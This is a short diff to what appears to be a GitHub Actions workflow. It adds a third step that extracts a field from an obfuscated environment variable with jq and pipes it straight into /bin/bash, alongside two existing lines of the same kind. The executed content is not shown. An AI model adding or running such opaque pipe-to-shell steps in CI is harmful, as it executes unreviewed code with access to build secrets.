@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$lyx293" | jq -r .uuv9 | /bin/bash
           echo $hthfz2 | jq -r .ktaq4225 | /bin/bash
+          printf '%s' "$fpedg21" | jq -r .b4 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
